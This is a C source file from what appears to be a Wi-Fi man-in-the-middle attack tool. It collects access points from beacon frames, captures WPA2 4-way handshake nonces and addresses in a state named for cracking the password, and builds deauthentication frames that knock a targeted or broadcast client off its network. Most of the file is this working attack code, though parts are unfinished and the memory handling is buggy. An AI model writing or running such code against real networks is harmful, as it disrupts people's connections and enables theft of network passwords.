#include "ieee80211_data.h"
#include "l2_packet.h"
#include "../../MITM.h"
static int parse_llc_header(const char* buf, size_t len, 
		uint32_t *offset, struct WPA2_handshake_packet *packet) {
	if (*offset > len) return -1;

	packet->llc_hdr = *(struct llc_header*)(buf + *offset);
	packet->llc_hdr.type = ntohs(packet->llc_hdr.type);
	*offset += sizeof(struct llc_header);
	return 0;
}

static int parse_auth_data(const char *buf, size_t len,
		uint32_t *offset, struct WPA2_handshake_packet *packet) {
	
	packet->auth_data = *(struct ieee_8021x_authentication*) (buf + *offset);
	*offset += sizeof(struct ieee_8021x_authentication);
	if (*offset > len) return -1;

	packet->auth_data.data = (buf + *offset);
	packet->auth_data.len = ntohs(packet->auth_data.len);
	print_handshake_packet(packet);
	return 0;
}

static int fill_encry_info(struct encrypto_info * info, const struct WPA2_handshake_packet *packet) {
	/* XXX : How to make sure the handshake packet is the same process ? */
	/* frame 2 of 4-way handshake */
	if ((packet->auth_data.key_information & WPA_KEY_INFO_MIC) &&
	    !(packet->auth_data.key_information & WPA_KEY_INFO_ACK) &&
	    !(packet->auth_data.key_information & WPA_KEY_INFO_INSTALL)) {
		memcpy(info->SN, packet->auth_data.Nonce, NONCE_ALEN);	
		memcpy(info->SA, LOCATE(u8, packet->ieee80211_data, struct ieee80211_hdr_3addr, addr2), ETH_ALEN);
	}
	/* frame 3 of 4-way handshake */
	if ((packet->auth_data.key_information & WPA_KEY_INFO_MIC) &&
	    (packet->auth_data.key_information & WPA_KEY_INFO_ACK) &&
	    (packet->auth_data.key_information & WPA_KEY_INFO_INSTALL) &&
	    !memcmp(info->SA, LOCATE(u8, packet->ieee80211_data, struct ieee80211_hdr_3addr, addr1), ETH_ALEN)) {
		memcpy(info->AN, packet->auth_data.Nonce, NONCE_ALEN);
	}

	/* frame 4 of 4-way handshake */
	//if ()


}

void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *buf, size_t len) {
	
	struct MITM *MITM = (struct MITM *)ctx; 

	uint32_t offset;
	uint16_t type;
	void *packet = NULL;
	char* mac_s;
	mac_s = malloc(20);

	offset = ((struct ieee80211_radiotap_header *)buf)->it_len;

	if (offset > len) return;

	type = parse_subtype(ntohs(*(uint32_t *)(buf + offset)));

	switch (type) {
		case IEEE80211_BEACON :;
			/* XXX : Do we only maintance ap list in ap search state ?
			 * or we should do this always?*/
			//if (MITM->state != MITM_state_ap_search)
			//	break;
			
			struct ieee80211_hdr_3addr frame;
			frame = *(struct ieee80211_hdr_3addr *)(buf + offset);
			offset += sizeof(struct ieee80211_hdr_3addr);

			struct beacon_fix_params fix_param;
			fix_param = *((struct beacon_fix_params *)(buf + offset));
			offset += sizeof(struct beacon_fix_params);

			struct access_point_info *ap_info;
			ap_info = malloc(sizeof(struct access_point_info));
			//ap_info->BSSID = mactostring(mac_s, frame.addr2);
			copy_mac_address(frame.addr2, ap_info->BSSID);
			for (;offset + 2 < len ;) {
				enum beacon_param tag_name = *(buf + (offset++));
				uint8_t tag_len = *(buf + (offset++));
				switch(tag_name) {
				case BEACON_SSID :
					ap_info->SSID = strndup(buf + offset, tag_len);
					break;
				case BEACON_COUNTRY_INFO :
					ap_info->country = strndup(buf + offset, tag_len);
					break;
				case BEACON_DS :
					ap_info->channel = atoi(strndup(buf + offset, tag_len));
				}
				offset += tag_len;
			}

			struct access_point_info *tmp;
			dl_list_for_each(tmp, &MITM->ap_list, struct access_point_info, ap_node) {
				if (!strcmp(tmp->SSID, ap_info->SSID)) {
					tmp->country = ap_info->country;
					tmp->channel = ap_info->channel;
					/* maybe call the strcpy() is a good ideal? */
					free(ap_info);
					break;
				}
			}
			dl_list_add_tail(&MITM->ap_list, &ap_info->ap_node);
		break;

		case IEEE80211_DATA : {
			/* we case the packet context util crash password. */
			if (MITM->state < 2) 
				break; 
			packet = malloc(sizeof(struct WPA2_handshake_packet));
			struct WPA2_handshake_packet *tmp = (struct WPA2_handshake_packet *)packet;
		       	tmp->type = type;	
			tmp->ieee80211_data = (struct ieee80211_hdr_3addr *)(buf + offset);
			/* Ignore packet which not came from target access point. */
			if (memcmp(LOCATE(u8 ,tmp->ieee80211_data, struct ieee80211_hdr_3addr, addr1),
					MITM->encry_info.AA, ETH_ALEN) &&
			    memcmp(LOCATE(u8, tmp->ieee80211_data, struct ieee80211_hdr_3addr, addr2),
				    	MITM->encry_info.AA, ETH_ALEN)) break;
			offset += sizeof(struct ieee80211_hdr_3addr);

			parse_llc_header(buf, len, &offset, packet);

			if (tmp->llc_hdr.type == 0x888e && 
			   (MITM->state == MITM_state_crash_password)) {
				parse_auth_data(buf, len, &offset, packet);
				fill_encry_info(&MITM->encry_info, packet);
			}

		break;}
		
		case IEEE80211_QOS_DATA :{
			/* we case the packet context util crash password. */
			if (MITM->state < 2)
				break;
			packet = malloc(sizeof(struct WPA2_handshake_packet));
			struct WPA2_handshake_packet *tmp = (struct WPA2_handshake_packet *)packet;
			tmp->type = type;
			tmp->ieee80211_data = (struct ieee80211_qos_hdr *)(buf + offset);
			offset += sizeof(struct ieee80211_qos_hdr);
			
			parse_llc_header(buf, len , &offset, packet);

			if (tmp->llc_hdr.type == 0x888e &&
			   (MITM->state == MITM_state_crash_password))
				parse_auth_data(buf, len, &offset, packet);
		
		break;}

		default:
			return;
	}
	free(mac_s);
	free(packet);
	return;
}

int prepare_deauth_pkt(u8 *buffer, size_t pkt_len, u8 *victim, u8 *ap, u16 seq_num) {
	int is_broadcast = 0;
	if (!buffer || !ap) {
		log_printf(MSG_WARNING, "[%s]buffer or ap not exist");
		return -1;
	}
	if (!victim) 
		is_broadcast = 1;
	struct ieee80211_radiotap_header radiotap_hdr;
	memset(&radiotap_hdr, 0, sizeof(struct ieee80211_radiotap_header));
	radiotap_hdr.it_version = 0;
	radiotap_hdr.it_pad = 0;
	radiotap_hdr.it_len = 13;
	radiotap_hdr.it_present = htonl(IEEE80211_RADIOTAP_RATE);
	radiotap_hdr.padload = 0x02;

	struct ieee80211_hdr_3addr deauth;
	memset(&deauth, 0, sizeof(struct ieee80211_hdr_3addr));
	deauth.frame_control = htons(0x000c);
	if (is_broadcast) 
		memset(deauth.addr2, 0xff, ETH_ALEN);
	else 
		memcpy(deauth.addr2, victim, ETH_ALEN);
	memcpy(deauth.addr1, ap, ETH_ALEN);
	memcpy(deauth.addr3, ap, ETH_ALEN);
	deauth.seq_ctrl = htons(seq_num);

	pkt_len = radiotap_hdr.it_len + sizeof(deauth);
	memcpy(buffer, &radiotap_hdr, radiotap_hdr.it_len);
	memcpy(buffer + radiotap_hdr.it_len, &deauth, sizeof(deauth));
	buffer[pkt_len++] = htons(deauth_unspec_reason);
}
